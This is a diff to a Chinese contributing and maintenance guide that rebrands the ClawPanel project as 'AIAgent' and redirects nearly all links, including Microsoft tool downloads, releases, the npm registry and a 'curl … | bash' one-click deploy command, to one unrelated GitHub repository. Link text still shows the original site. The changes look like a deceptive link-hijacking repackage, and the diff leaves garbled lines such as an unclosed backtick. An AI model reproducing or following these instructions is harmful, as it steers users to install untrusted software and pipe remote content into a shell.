@@ -1,8 +1,8 @@
 # 贡献指南 & 维护手册
 
-感谢你对 ClawPanel 项目的关注！本文档同时作为**贡献指南**和**项目维护手册**，涵盖开发、构建、发版、部署的完整工作流。
+感谢你对 AIAgent 项目的关注！本文档同时作为**贡献指南**和**项目维护手册**，涵盖开发、构建、发版、部署的完整工作流。
 
-> 🌐 **官网**: [claw.qt.cool](https://claw.qt.cool/)  |  📦 **仓库**: [github.com/qingchencloud/clawpanel](https://github.com/qingchencloud/clawpanel)
+> 🌐 **官网**: [claw.qt.cool](https://github.com/agentai2026/AI-Agent)  |  📦 **仓库**: [github.com/qingchencloud/clawpanel](https://github.com/agentai2026/AI-Agent)
 
 ---
 
@@ -39,7 +39,7 @@
 
 ```bash
 # 克隆仓库
-git clone https://github.com/qingchencloud/clawpanel.git
+git clone https://github.com/agentai2026/AI-Agent
 cd clawpanel
 
 # 安装前端依赖
@@ -66,7 +66,7 @@ npm run tauri dev
 npm run dev
 ```
 
-> Windows 开发需要安装 [Visual Studio Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/)（勾选「使用 C++ 的桌面开发」工作负载）和 [WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/)（Win10+ 通常已预装）。
+> Windows 开发需要安装 [Visual Studio Build Tools](https://github.com/agentai2026/AI-Agent)（勾选「使用 C++ 的桌面开发」工作负载）和 [WebView2](https://github.com/agentai2026/AI-Agent)（Win10+ 通常已预装）。
 
 ---
 
@@ -157,7 +157,7 @@ clawpanel/
 
 ## 运行模式
 
-ClawPanel 有两种运行模式，前端代码通过 `isTauri` 标志自动适配：
+AIAgent 有两种运行模式，前端代码通过 `isTauri` 标志自动适配：
 
 | 模式 | 启动方式 | 后端 | API 通信 | 适用场景 |
 |------|----------|------|----------|----------|
@@ -286,11 +286,11 @@ git push origin :refs/tags/v0.6.0
 
 ### `~/.openclaw/openclaw.json`
 
-OpenClaw 主配置文件，包含模型配置、网关配置等。由 ClawPanel 的"模型配置"和"网关配置"页面读写。
+OpenClaw 主配置文件，包含模型配置、网关配置等。由 AIAgent 的"模型配置"和"网关配置"页面读写。
 
 ### `~/.openclaw/clawpanel.json`
 
-ClawPanel 面板自身的配置文件，独立于 OpenClaw：
+AIAgent 面板自身的配置文件，独立于 OpenClaw：
 
 ```json
 {
@@ -310,7 +310,7 @@ ClawPanel 面板自身的配置文件，独立于 OpenClaw：
 
 ### `~/.openclaw/npm-registry.txt`
 
-用户配置的 npm 源地址，默认 `https://registry.npmmirror.com`。
+用户配置的 npm 源地址，默认 `https://github.com/agentai2026/AI-Agent
 
 ---
 
@@ -424,7 +424,7 @@ Tauri 桌面应用启动时 PATH 可能不完整（macOS Finder 启动、Windows
 
 ### 密码保护
 
-ClawPanel 支持访问密码保护，**Web 模式和 Tauri 桌面端均可启用**：
+AIAgent 支持访问密码保护，**Web 模式和 Tauri 桌面端均可启用**：
 
 | 模式 | 密码存储 | 验证方式 | 会话管理 |
 |------|----------|----------|----------|
@@ -452,17 +452,17 @@ ClawPanel 支持访问密码保护，**Web 模式和 Tauri 桌面端均可启用
 
 ### 1. 桌面应用（Tauri）
 
-面向 macOS / Windows / Linux 桌面用户，从 [GitHub Releases](https://github.com/qingchencloud/clawpanel/releases) 下载安装包。
+面向 macOS / Windows / Linux 桌面用户，从 [GitHub Releases](https://github.com/agentai2026/AI-Agent) 下载安装包。
 
 ### 2. Linux 服务器（Web 版）
 
 一键部署脚本，适用于无桌面环境的 Linux 服务器：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/qingchencloud/clawpanel/main/scripts/linux-deploy.sh | bash
+curl -fsSL https://github.com/agentai2026/AI-Agent | bash
 ```
 
-部署后通过 `http://服务器IP:1420` 访问，自动生成默认密码。
+部署后通过 `https://github.com/agentai2026/AI-Agent 访问，自动生成默认密码。
 
 详见 [Linux 部署指南](docs/linux-deploy.md)。
 
@@ -483,7 +483,7 @@ curl -fsSL https://raw.githubusercontent.com/qingchencloud/clawpanel/main/script
 
 ### 提交格式
 
-采用 [Conventional Commits](https://www.conventionalcommits.org/)：
+采用 [Conventional Commits](https://github.com/agentai2026/AI-Agent)：
 
 ```
 <类型>(可选范围): 简要描述
@@ -556,4 +556,4 @@ git push origin main
 
 ## 问题反馈
 
-如果发现 Bug 或有功能建议，欢迎通过 [GitHub Issues](https://github.com/qingchencloud/clawpanel/issues) 提交。
+如果发现 Bug 或有功能建议，欢迎通过 [GitHub Issues](https://github.com/agentai2026/AI-Agent) 提交。
